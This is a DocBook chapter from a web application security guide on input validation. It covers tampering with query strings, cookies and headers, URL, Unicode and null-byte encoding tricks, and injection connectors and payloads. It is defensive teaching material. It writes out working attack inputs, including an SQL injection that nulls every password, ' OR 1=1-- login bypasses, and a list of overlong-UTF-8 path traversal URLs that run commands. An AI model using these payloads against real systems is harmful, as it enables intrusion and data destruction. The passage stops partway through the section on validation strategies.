<!-- $Id: input_validation.xml,v 1.14 2003/04/03 13:55:59 awiesmann Exp $ -->
<chapter id="ch10">
	<chapterinfo>
		<authorgroup>
			<author>
				<firstname>Mark</firstname>
				<surname>Curphey</surname>
			</author>
			<author>
				<firstname>Gene</firstname>
				<surname>McKenna</surname>
			</author>
			<author>
				<firstname>Jeremy</firstname>
				<surname>Poteet</surname>
			</author>
		</authorgroup>
	</chapterinfo>
	<title>Data Input Validation</title>
	<sect1>
		<title>Introduction</title>
		<para>
      This chapter describes the most common problem that web
      applications typically exhibit, which is the failure to properly
      validate input from the client.  This failure leads to many of
      the major vulnerabilities in applications, such as SQL
      Injection, HTML Injection (aka Cross-Site Scripting) and Buffer Overflows.
      </para>
		<para>
      This chapter will deal with the following issues:
      </para>
		<itemizedlist mark="opencircle" spacing="compact">
			<listitem>
				<para>
            Input Sources - This section discusses the various sources
            of input that an application needs to protect.
            </para>
			</listitem>
			<listitem>
				<para>
            Input Formats - Input can be formatted or encoded in
            various ways that can make protecting an application more
            difficult.
            </para>
			</listitem>
			<listitem>
				<para>
            Concept of Injection - Most input vulnerabilities are
            based on the concept of injection.  Understanding this
            issue opens the door to SQL Injection and HTML Injection.
            </para>
			</listitem>
			<listitem>
				<para>
            Common Protection Techniques - There are various common
            techniques used to protect applications.  This section
            discusses the pros and cons of these techniques.
            </para>
			</listitem>
			<listitem>
				<para>
            Specific Vulnerabilities - Specific vulnerabilities
            including SQL Injection, HTML Injection (Cross-site Scripting)
	    and Buffer Overflows are discussed in view of the foundational
            information in the chapter.  How these specific
            vulnerabilities exploit flaws in the data input handling
            and how the proper validation checks protect the
            application is discussed.
            </para>
			</listitem>
		</itemizedlist>
	</sect1>
	<sect1>
		<title>Input Sources</title>
		<para>
      To understand how problems in input validation can pose
      significant security risks, we start with the data sources.
      There are various information sources that all must be protected
      to lock down an application.  Manipulating the data sent between
      the browser and the web application has long been a simple but
      effective way to allow an attacker to force applications to
      access sensitive or unauthorized information. No data sent to
      the browser can be relied upon to stay the same unless
      cryptographically protected at the application
      layer. Cryptographic protection in the transport layer (SSL) in
      no way protects one from attacks like parameter manipulation in
      which data is mangled before it hits the wire. The basic input
      sources are:
      </para>
		<itemizedlist mark="opencircle" spacing="compact">
			<listitem>
				<para>
            URL Query Strings
            </para>
			</listitem>
			<listitem>
				<para>
            Form Fields
            </para>
			</listitem>
			<listitem>
				<para>
            Cookies
            </para>
			</listitem>
			<listitem>
				<para>
            HTTP Headers
            </para>
			</listitem>
		</itemizedlist>
		<sect2>
			<title>URL Query Strings</title>
			<para>
         HTML Forms may submit their results using one of two methods:
         GET or POST. If the method is GET, all form element names and
         values will appear in the query string of the next URL the
         user sees. Tampering with query strings is as easy as
         modifying the URL in the browser's address bar.
         </para>
			<para>
         Take the following example; a web page allows the
         authenticated user to select one of his pre-populated
         accounts from a drop-down box to view the current
         balance. The user's choice is recorded by pressing the submit
         button. The page is actually storing the entry in a form
         field value and submitting it using a form submit
         command. The command sends the following HTTP request.
         </para>
			<programlisting>
         http://www.victim.com/example?accountnumber=12345
         </programlisting>
			<para>
         A malicious user could attempt to pass account numbers for
         other users to the application by changing the parameter as
         follows:
         </para>
			<programlisting>
         http://www.victim.com/example?accountnumber=67891
         </programlisting>
			<para>
         This new parameter would be sent to the application and be
         processed accordingly.  Many applications would rely on the
         fact that the correct account numbers for this user were in
         the drop down list and not recheck to make sure the account
         number supplied matches the logged in user.  By not
         rechecking the account number, the balance of other user's
         account can be exposed to an attacker.
         </para>
			<para>
         Unfortunately, it isn't just HTML forms that present these
         problems. Almost all navigation done on the Internet is
         through hyperlinks. When a user clicks on a hyperlink to
         navigate from one site to another, or within a single
         application, he is sending GET requests. Many of these
         requests will have a query string with parameters just like a
         form. A user can simply look in the "Address" window of his
         browser and change the parameter values.
         </para>
			<para>
         When parameters need to be sent from a client to a server,
         they should be accompanied by a valid session token. The
         session token may also be a parameter, or a cookie. Session
         tokens have their own special security. In the example above,
         the application should not allow access to the account
         without first checking if the user associated with the
         session has permission to view the account specified by the
         parameter "accountnumber".  The script that processes the
         account request cannot assume that access control decisions
         were made on previous application pages.
         </para>
		</sect2>
		<sect2>
			<title>Form Fields</title>
			<para>
         HTML form fields come in many different styles, such as text
         fields, drop downs, radio buttons and check boxes. HTML can
         also store field values as hidden fields, which are not
         rendered to the screen by the browser but are collected and
         submitted as parameters during form submissions.
         </para>
			<para>
         Whether these form fields are pre-selected (drop down, check
         boxes etc.), free form text fields or hidden, they can all be
         manipulated by the user to submit whatever values he/she
         chooses. In most cases this is as simple as saving the page
         using "view source", "save", editing the HTML and re-loading
         the page in the web browser.
         </para>
			<para>
         Some developers try to prevent the user from entering large
         values by setting a form field attribute maxlength=(an
         integer) in the belief they will prevent a malicious user
         from attempting to inject buffer overflows of overly long
         parameters. However the malicious user can simply save the
         page, remove the maxlength tag and reload the page in his
         browser. Other interesting form field attributes include
         disabled and readonly. Data (and code) sent to clients must
         not be relied upon until it is properly validated. Code sent
         to browsers is merely a set of suggestions and has no
         security value.
         </para>
			<para>
         Hidden form fields represent a convenient way for developers
         to store data in the browser and are one of the most common
         ways of carrying data between pages in wizard type
         applications. All of the same rules apply to hidden forms
         fields as apply to regular form fields.
         </para>
			<para>
         For example, a login form with the following hidden form
         field may be exposing a significant vulnerability:
         </para>
			<programlisting>
         &lt;input name="masteraccess" type="hidden" value="N"&gt;
         </programlisting>
			<para>
         By manipulating the hidden value to a Y, the application
         would have logged the user in as an Administrator. Hidden
         form fields are extensively used in a variety of ways and
         while it's easy to understand the dangers, they still are
         found to be significantly vulnerable in the wild.
         </para>
			<para>
         Instead of using hidden form fields, the application designer
         can simply use one session token to reference properties
         stored in a server-side cache. When an application needs to
         check a user property, it checks the session cookie with its
         session table and points to the user's data variables in the
         cache/database. This is by far a more secure way to architect
         this problem.
         </para>
			<para>
         If the above technique of using a session variable instead of
         a hidden field cannot be implemented, a second approach is as
         follows.
         </para>
			<para>
         The name/value pairs of the hidden fields in a form can be
         concatenated together into a single string. A secret key that
         never appears in the form is also appended to the
         string. This string is called the Outgoing Form Message. An
         MD5 digest or other one-way hash is generated for the
         Outgoing Form Message. This is called the Outgoing Form
         Digest and it is added to the form as an additional hidden
         field.
         </para>
			<para>
         When the form is submitted, the incoming name/value pairs are
         again concatenated along with the secret key into an Incoming
         Form Message. An MD5 digest of the Incoming Form Message is
         computed. Then the Incoming Form Digest is compared to the
         Outgoing Form Digest (which is submitted along with the form)
         and if they do not match, then a hidden field has been
         altered. Note, for the digests to match, the name/value pairs
         in the Incoming and Outgoing Form Messages must concatenated
         together in the exact same order both times.
         </para>
			<para>
         This same technique can be used to prevent tampering with
         parameters in a URL. An additional digest parameter can be
         added to the URL query string following the same technique
         described above.
         </para>
		</sect2>
		<sect2>
			<title>Cookies</title>
			<para>
         Cookies are a common method to maintain state in the
         stateless HTTP protocol. They are also used as a convenient
         mechanism to store user preferences and other data including
         session tokens. Both persistent and nonpersistent cookies can
         be modified by the client and sent to the server with URL
         requests. Therefore any malicious user can modify cookie
         content to his advantage. There is a popular misconception
         that nonpersistent cookies cannot be modified but this is not
         true. Also, SSL only protects the cookie in transit.
         </para>
			<para>
         The extent of cookie manipulation depends on what the cookie
         is used for but usually ranges from session tokens to arrays
         that make authorization decisions. (Many cookies are Base64
         encoded; this is an encoding scheme and offers no
         cryptographic protection).
         </para>
			<para>
         As an example, a cookie with the following value:
         </para>
			<programlisting>
         Cookie: lang=en-us; ADMIN=no; y=1 ; time=10:30GMT ;
         </programlisting>
			<para>
         can simply be modified to:
         </para>
			<programlisting>
         Cookie: lang=en-us; ADMIN=yes; y=1 ; time=12:30GMT ;
         </programlisting>
			<para>
         One mitigation technique is to simply use one session token
         to reference properties stored in a server-side cache. This
         is by far the most reliable way to ensure that data is sane
         on return: simply do not trust user input for values that you
         already know. When an application needs to check a user
         property, it checks the userid with its session table and
         points to the users data variables in the cache/database.
         </para>
			<para>
         Another technique involves building intrusion detection hooks
         to evaluate the cookie for any infeasible or impossible
         combinations of values that would indicate tampering. For
         instance, if the "administrator" flag is set in a cookie, but
         the userid value does not belong to someone on the
         development team.
         </para>
			<para>
         The final method is to encrypt the cookie to prevent
         tampering. There are several ways to do this including
         hashing the cookie and comparing hashes when it is returned
         or a symmetric encryption.
         </para>
		</sect2>
		<sect2>
			<title>HTTP Headers</title>
			<para>
         HTTP headers are control information passed from web clients
         to web servers on HTTP requests, and from web servers to web
         clients on HTTP responses. Each header normally consists of a
         single line of ASCII text with a name and a value. Sample
         headers from a POST request follow.
         </para>
			<programlisting>
         Host: www.someplace.org
         Pragma: no-cache
         Cache-Control: no-cache
         User-Agent: Lynx/2.8.4dev.9 libwww-FM/2.14
         Referer: http://www.someplace.org/login.php
         Content-type: application/x-www-form-urlencoded
         Content-length: 49
         </programlisting>
			<para>
         Often HTTP headers are used by the browser and the web server
         software only. Most web applications pay no attention to
         them. However some web developers choose to inspect incoming
         headers, and in those cases it is important to realize that
         request headers originate at the client side, and they may
         thus be altered by an attacker.
         </para>
			<para>
         Normal web browsers do not allow header modification. An
         attacker will have to write his own program (about 15 lines
         of Perl code will do) to perform the HTTP request, or he may
         use one of several freely available proxies that allow easy
         modification of any data sent from the browser.
         </para>
			<para>
         The Referer header (note the spelling), which is sent by most
         browsers, normally contains the URL of the web page from
         which the request originated. Some web sites choose to check
         this header in order to make sure the request originated from
         a page generated by them, for example in the belief it
         prevents attackers from saving web pages, modifying forms,
         and posting them off their own computer. This security
         mechanism will fail, as the attacker will be able to modify
         the Referer header to look like it came from the original
         site.
         </para>
			<para>
         The Accept-Language header indicates the preferred
         language(s) of the user. A web application doing
         internationalization (i18n) may pick up the language label
         from the HTTP header and pass it to a database in order to
         look up a text. If the content of the header is sent verbatim
         to the database, an attacker may be able to inject SQL
         commands (see SQL injection) by modifying the
         header. Likewise, if the header content is used to build a
         name of a file from which to look up the correct language
         text, an attacker may be able to launch a path traversal
         attack.
         </para>
			<para>
         Simply put headers cannot be relied upon without additional
         security measures. If a header originated server-side such as
         a cookie it can be cryptographically protected. If it
         originated client-side such as a referer it should not be
         used to make any security decisions.
         </para>
			<para>
         For more information on headers, please see RFC 2616, which
         defines HTTP/1.1.
         </para>
		</sect2>
	</sect1>
	<sect1>
		<title>Input Formats</title>
		<para>
      Canonicalization deals with the way in which systems convert
      data from one form to another. Canonical means the simplest or
      most standard form of something. Canonicalization is the process
      of converting something from one representation to the simplest
      form. Web applications have to deal with lots of
      canonicalization issues from URL encoding to IP address
      translation. When security decisions are made based on canonical
      forms of data, it is therefore essential that the application is
      able to deal with canonicalization issues accurately.
      </para>
		<sect2>
			<title>URL Encoding</title>
			<para>
         The RFC 1738 specification defining Uniform Resource Locators
         (URLs) and the RFC 2396 specification for Uniform Resource
         Identifiers (URIs) both restrict the characters allowed in a
         URL or URI to a subset of the US-ASCII character
         set. According to the RFC 1738 specification, "only
         alphanumerics, the special characters "$-_.+!*'(),", and
         reserved characters used for their reserved purposes may be
         used unencoded within a URL." The data used by a web
         application, on the other hand, is not restricted in any way
         and in fact may be represented by any existing character set
         or even binary data. Earlier versions of HTML allowed the
         entire range of the ISO-8859-1 (ISO Latin-1) character set;
         the HTML 4.0 specification expanded to permit any character
         in the Unicode character set.
         </para>
			<para>
         URL-encoding a character is done by taking the character's
         8-bit hexadecimal code and prefixing it with a percent sign
         ("%"). For example, the US-ASCII character set represents a
         space with decimal code 32, or hexadecimal 20.  Thus its
         URL-encoded representation is %20.
         </para>
			<para>
         Even though certain characters do not need to be URL-encoded,
         any 8-bit code (i.e., decimal 0-255 or hexadecimal 00-FF) may
         be encoded. ASCII control characters such as the NULL
         character (decimal code 0) can be URL-encoded, as can all
         HTML entities and any meta characters used by the operating
         system or database. Because URL-encoding allows virtually any
         data to be passed to the server, proper precautions must be
         taken by a web application when accepting data. URL-encoding
         can be used as a mechanism for disguising many types of
         malicious code.
         </para>
			<para>
         Here is a SQL Injection example that shows how this attack
         can be accomplished.
         </para>
			<para>
         Original database query in search.asp:
         </para>
			<programlisting>
         sql = "SELECT lname, fname, phone FROM usertable WHERE lname='" &amp;Request("lname")
         </programlisting>
			<para>
         HTTP request:
         </para>
			<programlisting>
         http://www.myserver.com/search.asp?lname=smith%27%3bupdate%20usertable%20set%20password%20=%20NULL
         </programlisting>
			<para>
         Executed database query:
         </para>
			<programlisting>
         SELECT lname, fname, phone FROM usertable WHERE lname='smith';update usertable set password = NULL
         </programlisting>
			<para>
         A suitable canonical form should be chosen and all user input
         canonicalized into that form before any authorization
         decisions are performed. Security checks should be carried
         out after decoding is completed. It is usually the web server
         itself that decodes the URL and hence this problem may only
         occur on the web server itself.
         </para>
		</sect2>
		<sect2>
			<title>Unicode</title>
			<para>
         Unicode Encoding is a method for storing characters with
         multiple bytes. Wherever input data is allowed, data can be
         entered using Unicode to disguise malicious code and permit a
         variety of attacks. RFC 2279 references many ways that text
         can be encoded.
         </para>
			<para>
         Unicode was developed to allow a Universal Character Set
         (UCS) that encompasses most of the world's writing
         systems. Multi-octet characters, however, are not compatible
         with many current applications and protocols, and this has
         led to the development of a few UCS transformation formats
         (UTF) with varying characteristics. UTF-8 has the
         characteristic of preserving the full US-ASCII range. It is
         compatible with file systems, parsers and other software
         relying on US-ASCII values, but it is transparent to other
         values.
         </para>
			<para>
         The importance of UTF-8 representation stems from the fact
         that web-servers/applications perform several steps on their
         input of this format. The order of the steps is sometimes
         critical to the security of the application. Basically, the
         steps are "URL decoding" potentially followed by "UTF-8
         decoding", and intermingled with them are various security
         checks, which are also processing steps. If, for example, one
         of the security checks is searching for "..", and it is
         carried out before UTF-8 decoding takes place, it is possible
         to inject ".." in their overlong UTF-8 format. Even if the
         security checks recognize some of the non-canonical format
         for dots, it may still be that not all formats are known to
         it. Examples: Consider the ASCII character "." (dot). Its
         canonical representation is a dot (ASCII 2E). Yet if we think
         of it as a character in the second UTF-8 range (2 bytes), we
         get an overlong representation of it, as C0 AE. Likewise,
         there are more overlong representations: E0 80 AE, F0 80 80
         AE, F8 80 80 80 AE and FC 80 80 80 80 AE.
         </para>
			<table frame="all">
				<title/>
				<tgroup cols="2" align="left" colsep="1" rowsep="1">
					<colspec colname="c1"/>
					<colspec colname="c2"/>
					<thead>
						<row>
							<entry align="center">
                     UCS-4 Range
                     </entry>
							<entry align="center">
                     UTF-8 encoding
                     </entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
                     0x00000000-0x0000007F
                     </entry>
							<entry>
                     0xxxxxxx
                     </entry>
						</row>
						<row>
							<entry>
                     0x00000080 - 0x000007FF
                     </entry>
							<entry>
                     110xxxxx 10xxxxxx
                     </entry>
						</row>
						<row>
							<entry>
                     0x00000800-0x0000FFFF
                     </entry>
							<entry>
                     1110xxxx 10xxxxxx 10xxxxxx
                     </entry>
						</row>
						<row>
							<entry>
                     0x00010000-0x001FFFFF
                     </entry>
							<entry>
                     11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
                     </entry>
						</row>
						<row>
							<entry>
                     0x00200000-0x03FFFFFF
                     </entry>
							<entry>
                     111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
                     </entry>
						</row>
						<row>
							<entry>
                     0x04000000-0x7FFFFFFF
                     </entry>
							<entry>
                     1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
                     </entry>
						</row>
					</tbody>
				</tgroup>
			</table>
			<para>
         Consider the representation C0 AE of a ".". Like UTF-8
         encoding requires, the second octet has "10" as its two most
         significant bits. Now, it is possible to define 3 variants
         for it, by enumerating the rest of the possible 2 bit combinations
         ("00", "01" and "11"). Some UTF-8 decoders would treat these
         variants as identical to the original symbol (they simply use
         the least significant 6 bits, disregarding the most
         significant 2 bits). Thus, the 3 variants are C0 2E, C0 5E
         and C0 FE.
         </para>
			<para>
         It is thus possible to form illegal UTF-8 encodings, in two
         senses:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               A UTF-8 sequence for a given symbol may be longer than
               necessary for representing the symbol.
               </para>
				</listitem>
				<listitem>
					<para>
               A UTF-8 sequence may contain octets that are in
               incorrect format (i.e. do not comply with the above 6
               formats).
               </para>
				</listitem>
			</itemizedlist>
			<para>
         To further "complicate" things, each representation can be
         sent over HTTP in several ways:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               In the raw. That is, without URL encoding at all. This
               usually results in sending non-ASCII octets in the
               path, query or body, which violates the HTTP
               standards. Nevertheless, most HTTP servers do get along
               just fine with non-ASCII characters.
               </para>
				</listitem>
				<listitem>
					<para>
               Valid URL encoding.  Each non-ASCII character (more
               precisely, all characters that require URL encoding - a
               superset of non ASCII characters) is URL-encoded. This
               results in sending, say, %C0%AE.
               </para>
				</listitem>
				<listitem>
					<para>
               Invalid URL encoding. This is a variant of valid URL
               encoding, wherein some hexadecimal digits are replaced
               with non-hexadecimal digits, yet the result is still
               interpreted as identical to the original, under some
               decoding algorithms. For example, %C0 is interpreted as
               character number ('C'-'A'+10)*16+('0'-'0') =
               192. Applying the same algorithm to %M0 yields
               ('M'-'A'+10)*16+('0'-'0') = 448, which, when forced
               into a single byte, yields (8 least significant bits)
               192, just like the original. So, if the algorithm is
               willing to accept non-hexadecimal digits (such as 'M'),
               then it is possible to have variants for %C0 such as
               %M0 and %BG.
               </para>
				</listitem>
			</itemizedlist>
			<para>
         It should be kept in mind that these techniques are not
         directly related to Unicode, and they can be used in
         non-Unicode attacks as well.
         </para>
			<programlisting>
         http://host/cgi-bin/bad.cgi?foo=../../bin/ls%20-al
         </programlisting>
			<para>
         URL Encoding of the example attack:
         </para>
			<programlisting>
         http://host/cgi-bin/bad.cgi?foo=..%2F../bin/ls%20-al
         </programlisting>
			<para>
         Unicode encoding of the example attack:
         </para>
			<programlisting>
         http://host/cgi-bin/bad.cgi?foo=..%c0%af../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%pc../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c0%9v../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c0%qf../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%8s../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%1c../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%9c../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%c1%af../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%e0%80%af../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%f0%80%80%af../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%f8%80%80%80%af../bin/ls%20-al
         http://host/cgi-bin/bad.cgi?foo=..%fc%80%80%80%80%af../bin/ls%20-al
         </programlisting>
			<para>
         A suitable canonical form should be chosen and all user input
         canonicalized into that form before any authorization
         decisions are performed. Security checks should be carried
         out after UTF-8 decoding is completed. Moreover, it is
         recommended to check that the UTF-8 encoding is a valid
         canonical encoding for the symbol it represents.
         </para>
			<para>
         http://www.ietf.org/rfc/rfc2279.txt?number=2279
         </para>
		</sect2>
		<sect2>
			<title>Null Bytes</title>
			<para>

While web applications may be developed in a variety of programming languages, these applications often pass data to underlying lower level C-functions for further processing and functionality.

         </para>
			<para>
         If a given string, lets say "AAA\0BBB" is accepted as a valid
         string by a web application (or specifically the programming
         language), it may be shortened to "AAA" by the underlying
         C-functions. This occurs because C/C++ perceives the null
         byte (\0) as the termination of a string. Applications that
         do not perform adequate input validation can be fooled by
         inserting null bytes in "critical" parameters. This is
         normally done by URL Encoding the null bytes (%00). In
         special cases it is possible to use Unicode characters.
         </para>
			<para>
         The attack can be used to:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               Disclose physical paths, files and OS-information
               </para>
				</listitem>
				<listitem>
					<para>
               Truncate strings
               </para>
				</listitem>
				<listitem>
					<para>
               Truncate Paths
               </para>
				</listitem>
				<listitem>
					<para>
               Truncate Files
               </para>
				</listitem>
				<listitem>
					<para>
               Truncate Commands
               </para>
				</listitem>
				<listitem>
					<para>
               Truncate Command parameters
               </para>
				</listitem>
				<listitem>
					<para>
               Bypass validity checks, looking for substrings in
               parameters
               </para>
				</listitem>
				<listitem>
					<para>
               Cut off strings passed to SQL Queries
               </para>
				</listitem>
			</itemizedlist>
			<para>
         The most popular affected scripting and programming languages
         are:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               Perl (highly)
               </para>
				</listitem>
				<listitem>
					<para>
               Java (File, RandomAccessFile and similar Java-Classes)
               </para>
				</listitem>
				<listitem>
					<para>
               PHP (depending on its configuration)
               </para>
				</listitem>
			</itemizedlist>
			<para>
         Preventing null byte attacks requires that all input be
         validated before the application acts upon it.
         </para>
		</sect2>
	</sect1>
	<sect1>
		<title>Injection</title>
		<para>
      Now that you understand where data comes from in a web
      application and some of the different forms it may take, we now
      look at the core issue of these types of attacks: injection.
      Injection itself is not a vulnerability, but injecting data that
      has not been properly validated usually is.  This section will
      breakdown how injection techniques work.  Later in this chapter
      we will look at specific attacks such as SQL Injection, XSS and
      Buffer Overflow.  All of those attacks are simply variations on
      the premise of injection.
      </para>
		<sect2>
			<title>How is Data Injected?</title>
			<para>
         One way of looking at applications is that they are made up
         of two distinct parts.  The first part is what the developers
         create.  This includes the code, the HTML, the SQL, the OS
         command calls or any other developer created components.  The
         other part of the application is what the user provides.
         This involves the data or information provided by the user,
         which is then injected or merged with the developer portion
         of the application to produce the desired result.
         </para>
			<para>
         For example, a developer may have created the following SQL
         code:
         </para>
			<programlisting>
         strSQL = "SELECT * FROM NewsTable WHERE NewsID = " + newsId;
         </programlisting>
			<para>
         By clicking on the link for the news article she wants to
         read, the user supplies the newsID of 228, which is then
         injected into the application resulting in the following line
         of code:
         </para>
			<programlisting>
         strSQL = "SELECT * FROM NewsTable WHERE NewsID = 228";
         </programlisting>
			<para>
         The code executes and the desired news story is returned to
         the user for viewing.  In and of itself, there is nothing
         malicious in the injection.  In fact, it is the basic premise
         of all application development.  There are countless
         techniques for how injection will take place, but the basic
         concept holds true across all tools, languages and
         techniques.
         </para>
			<para>
         Another example would be, the following code which attempts
         to open a template file for use by the application:
         </para>
			<programlisting>
         open(TEMPLATE, $template) or die "Cannot open template file: $template: $!\n";
         </programlisting>
			<para>
         In this case, the template file name is being supplied as a
         hidden form field.  When the user fills in the form and
         clicks on submit, the template file of "user.tmpl" is
         injected into the application resulting in:
         </para>
			<programlisting>
         open(TEMPLATE, "user.tmpl") or die "Cannot open template file: user.tmpl: $!\n";
         </programlisting>
			<para>
         Finally, we see injection play out very visibly when we use a
         web application that changes the HTML because of the
         information we provide.  For example, after logging into the
         application, the following code is run:
         </para>
			<programlisting>
         output.write("&lt;h2&gt;Welcome back, " + userName + ".&lt;/h2&gt;");
         </programlisting>
			<para>
         After our user information has been supplied, it is injected
         into the code as:
         </para>
			<programlisting>
         output.write("&lt;h2&gt;Welcome back, Jeremy.&lt;/h2&gt;");
         </programlisting>
			<para>
         This information is then returned to the user as part of the
         HTML page to personalize the information.  None of the
         techniques we have looked at here are necessarily vulnerable.
         This concept is a basic building block of how applications
         are developed.  However, we now turn our attention to how
         this technique can be perverted.  Without the proper checks,
         this technique can be used as a launching point for many
         simple yet very effective attacks.
         </para>
		</sect2>
		<sect2>
			<title>Connectors and Payload</title>
			<para>
         The basic premise of injection attacks is to supply data that
         when injected into the application will cause a particular
         affect.  The attack is completely contained in the data
         provided by the attacker.  The data provided can be broken
         into three distinct segments:
         </para>
			<itemizedlist mark="opencircle" spacing="compact">
				<listitem>
					<para>
               Prefix Connector
               </para>
				</listitem>
				<listitem>
					<para>
               Payload
               </para>
				</listitem>
				<listitem>
					<para>
               Suffix Connector
               </para>
				</listitem>
			</itemizedlist>
			<para>
         While much of the focal point of injection attacks tends to
         be around the payload or the portion of that attack that
         performs the damage, the real focus should be around the
         connectors.  The connectors are the portion of the attack
         that allow the attack to be spliced into the application, so
         that the developer created code will execute properly now
         with the added payload.  Without properly constructed
         connectors, an error will usually be generated and the
         payload may never be delivered.
         </para>
			<para>
         In order to understand the full scope of what connectors can
         be used and to fully mitigate the injection issue, requires a
         thorough understanding of the language, tools and techniques
         used in the application.  A deep understanding of these
         components by an attacker results in a dangerous adversary.
         A deep understanding by the developers can result in an
         application that protects itself from injection attacks.
         </para>
			<para>
         While we will look at connectors and payload more
         specifically in the section on Specific Attacks, let's look
         at an example to see how connectors come into play.  First we
         look at the SQL code for a login screen:
         </para>
			<programlisting>
         strSQL =  "SELECT * FROM UserTable WHERE login = '" + userLogin + "' AND password = '" + userPassword + "'";
         </programlisting>
			<para>
         If we are going to inject an attack into the userLogin field,
         we first need to address the SQL code that comes before and
         after the userLogin field.  For this example, let's say we
         want to try to login as the first user in the database.  In
         that case, we don't want the SQL statement to match a valid
         login id, so we set our prefix connector to be a "' OR ", a
         single quote followed by the word or.  This closes out the
         portion of the SQL statement "WHERE login = '' OR ".  While
         this may not find a user, it is valid SQL and allows us to
         splice in our attack without generating a SQL error.
         </para>
			<para>
         For the suffix connector, we need to match a single quote
         there as well.  We also have the additional SQL clause of
         checking the password to contend with.  Our suffix connector
         will have the following syntax " OR login='".  This closes
         out the SQL statement with " OR login='' AND password = ...".
         </para>
			<para>
         We can now add a payload of "1=1", which is simply a
         statement that will evaluate to true.  The effect of this is
         to return the first user from the database.  The data we
         provide in the attack is now:
         </para>
			<table frame="all">
				<title/>
				<tgroup cols="3" align="left" colsep="1" rowsep="1">
					<colspec colname="c1"/>
					<colspec colname="c2"/>
					<colspec colname="c3"/>
					<thead>
						<row>
							<entry align="center">
                     Prefix Connector
                     </entry>
							<entry align="center">
                     Payload
                     </entry>
							<entry align="center">
                     Suffix Connector
                     </entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
                     ' OR 
                     </entry>
							<entry>
                     1=1
                     </entry>
							<entry>
                     OR login='
                     </entry>
						</row>
					</tbody>
				</tgroup>
			</table>
			<para>
         The resulting SQL when this attack is injected is:
         </para>
			<programlisting>
         SELECT * FROM UserTable WHERE login = '' OR 1=1 OR login ='' AND password = ''
         </programlisting>
			<para>
         With more knowledge about SQL and the database in use, we can
         modify our connectors to vary the attack signature.  For
         example, we can modify the payload and eliminate the suffix
         connector.
         </para>
			<table frame="all">
				<title/>
				<tgroup cols="3" align="left" colsep="1" rowsep="1">
					<colspec colname="c1"/>
					<colspec colname="c2"/>
					<colspec colname="c3"/>
					<thead>
						<row>
							<entry align="center">
                     Prefix Connector
                     </entry>
							<entry align="center">
                     Payload
                     </entry>
							<entry align="center">
                     Suffix Connector
                     </entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
                     ' OR 
                     </entry>
							<entry>
                     '1'='1
                     </entry>
							<entry>
                     &nbsp;
                     </entry>
						</row>
					</tbody>
				</tgroup>
			</table>
			<para>
         The resulting SQL when this attack is injected is:
         </para>
			<programlisting>
         SELECT * FROM UserTable WHERE login = '' OR '1'='1' AND password = ''
         </programlisting>
			<para>
         This attack would have the same effect, but with a slightly
         different technique. If the database in use was SQL Server,
         Oracle or another database that supported comments, we could
         use the suffix connector to eliminate the password portion of
         the SQL clause.
         </para>
			<table frame="all">
				<title/>
				<tgroup cols="3" align="left" colsep="1" rowsep="1">
					<colspec colname="c1"/>
					<colspec colname="c2"/>
					<colspec colname="c3"/>
					<thead>
						<row>
							<entry align="center">
                     Prefix Connector
                     </entry>
							<entry align="center">
                     Payload
                     </entry>
							<entry align="center">
                     Suffix Connector
                     </entry>
						</row>
					</thead>
					<tbody>
						<row>
							<entry>
                     ' OR 
                     </entry>
							<entry>
                     1=1
                     </entry>
							<entry>
                     --
                     </entry>
						</row>
					</tbody>
				</tgroup>
			</table>
			<para>
         The resulting SQL when this attack is injected is:
         </para>
			<programlisting>
         SELECT * FROM UserTable WHERE login = '' OR 1=1--
         </programlisting>
			<para>
         The double-dash comments out the rest of the line and allows
         the attacker to perform the same attack with a very
         restricted amount of space.  This attack comprises of 10
         characters, which would fit in most user login fields.
         </para>
			<para>
         One question that remains is how easy is it for an attacker
         to determine the proper connectors to attack to deliver the
         payload.  Unfortunately, this is not a difficult task.
         Obviously, access to the source code, whether from an insider
         or through a source code disclosure vulnerability, takes all
         of the effort out of the task.  Even without the source code,
         this is a straightforward effort.  Detailed error messages
         often give all of the necessary information to get the format
         of the attack correct and often even include snippets of the
         surrounding code, which makes the job even easier.  However,
         what makes this category of attacks so powerful is that even
         without source code or detailed error messages, these attacks
         are often successful, simply because of the common techniques
         used to develop applications.  While security through
         obscurity is rarely if ever a good idea, with injection
         attacks it is almost certainly a recipe for disaster.
         </para>
		</sect2>
	</sect1>
	<sect1>
		<title>Common Validation Strategies</title>
		<para>
      Many of the common attacks on systems can be prevented, or the
      threat of occurrence can be significantly reduced, by
      appropriate data validation. Data validation is one of the most
      important aspects of designing a secure web application. When we
      refer to data validation, we are referring to both input to and
      output from a web application.
      </para>
		<para>
      Data validation strategies are often heavily influenced by the
      architecture for the application. If the application is already
      in production it will be significantly harder to build the
      optimal architecture than if the application is still in a
      design stage. If a system takes a typical architectural approach
      of providing common services then one common component can
      filter all input and output, thus optimizing the rules and
      minimizing efforts.
      </para>
		<para>
      There are three main models to think about when designing a data
      validation strategy.
      </para>
		<itemizedlist mark="opencircle" spacing="compact">
			<listitem>
				<para>
            Accept Only Known Valid Data
            </para>
			</listitem>
			<listitem>
				<para>
            Reject Known Bad Data
            </para>
			</listitem>
			<listitem>
				<para>
            Sanitize Bad Data
            </para>
			</listitem>
		</itemizedlist>
		<para>
